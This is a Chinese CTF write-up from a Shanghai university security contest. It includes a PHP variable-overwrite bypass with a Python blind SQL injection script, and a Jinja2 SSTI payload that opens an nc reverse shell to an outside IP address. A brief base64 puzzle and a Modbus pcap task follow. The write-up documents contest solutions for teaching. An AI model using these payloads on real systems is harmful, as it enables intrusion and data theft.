title:  第五届上海市大学生网络安全大赛-初赛wp
categories: [CTF]
tags: [wp,web]

---

周末去打了下上海市，虽然有的是原题魔改但感觉有点题还是有点意思，故书之。<!--more-->
## web

### 千毒网盘

从`www.zip`获得了原码。审查原码：

```PHP
foreach(array('_GET', '_POST', '_COOKIE') as $key)
			{   
				if($$key) {
					foreach($$key as $key_2 => $value_2) { 
						if(isset($$key_2) and $$key_2 == $value_2) 
							unset($$key_2); 
					}
				}
			}
			if(isset($_POST['code'])) $_POST['code'] = $pan->filter($_POST['code']);
			if($_GET) extract($_GET, EXTR_SKIP);
			if($_POST) extract($_POST, EXTR_SKIP);
			if(isset($_POST['code']))
			{
				$message = $pan->getfile();
				echo <<<EOF
				<div class="alert alert-dismissable alert-info">
				 <button type="button" class="close" data-dismiss="alert" aria-hidden="true">×</button>
				<h4>
					注意!
				</h4> <strong>注意!</strong> {$message}
				</div>
EOF;
			}
```

发现有可以变量覆盖绕过waf。及get提交一个`_POST['code']` 就可以让post中code覆盖掉。(注意编码就行。)

```python
#coding:utf-8
import requests
import string
import time
url = 'http://eci-2zeikzil0vb2fhx1hg0q.cloudeci1.ichunqiu.com/index.php?_POST[code]='

res = ''
headers = {
	"Host": "eci-2ze5g0l1bms27122px6b.cloudeci1.ichunqiu.com",
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
	"Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
	"Accept-Encoding": "gzip, deflate",
	"Content-Type": "application/x-www-form-urlencoded"
	}

#ctf
#file,flag
#flag
i = 1
while True:
	max = 255
	min = 0
	while abs(max - min)>1:
		mid = (max + min)//2
		pay = "233333' and if(ascii(substr((select flag from flag),{},1))>{},1,0)#".format(i,mid)
		data = {"code": pay}
		pay2 = "233333' and if(ascii(substr((select flag from flag),{},1))>{},1,0)%23".format(i,mid)
		r = requests.post(url=url+pay2,data=data,headers=headers)
		# print url+pay
		# print data
		# print r.text
		if 'http://127.0.0.1/2333.gif' in r.text:
			min = mid
		else:
			max = mid
	i += 1
	res += chr(max)
	if chr(max) not in string.printable:
		break
	print(res)
```



### Hello

进入题目,根据提示得到了原码.

```python
from flask import Flask,request,render_template
from jinja2 import Template
import os

app = Flask(__name__)

f = open('/flag','r')
flag = f.read()
@app.route('/',methods=['GET','POST'])
def home():
    name = request.args.get("name") or ""
    print(name)
    if name:
        return render_template('index.html',name=name)
    else:
        return render_template('index.html')

@app.route('/help',methods=['GET'])
def help():
    help = '''
    '''
        return f.read()

@app.errorhandler(404)
def page_not_found(e):
    #No way to get flag!
    os.system('rm -f /flag')
    url = name = request.args.get("name") or ""
    # r = request.path
    r = request.data.decode('utf8')
    if 'eval' in r or 'popen' in r or '{{' in r:
        t = Template(" Not found!")
        return render_template(t), 404
    t = Template(r + " Not found!")
    return render_template(t), 404


if __name__ == '__main__':
    app.run(host='0.0.0.0',port=8888)
```

发现在`@app.errorhandler(404)`有ssti。

先访问不存在页面，然后抓包修改为post传参即可绕过page_no_found，然后过滤了一些关键字，字符拼接和'{  %'。由于是无回显，且删除了flag。推测'在linux里如果打开了一个文件而没有关闭，就算删除了文件（即rm -f flag）在/proc/[pid]/fd下还是会存在'的考点，尝试反弹shell，在进程里面找到flag。最终payload:

```
%if 'p'+'open'==os['p'+'open']('nc 39.100.119.234 8080 -t -e /bin/bash') %}1{% endif %}
```



## Misc

### 签到

{echo,ZmxhZ3t3MzFjMG1lNX0=}|{base64,-d}|{tr,5,6} 分析这段代码，怀疑是linux 的命令结果理解，解base64后，将5替换成6.即得到flag。

### pcap analysis

对Modbus协议进行追踪，在分析Modbus协议写寄存器的数据数据时发现 ：

![image-20201115183623046](image-20201115183623046.png)s

拼接后即得到flag。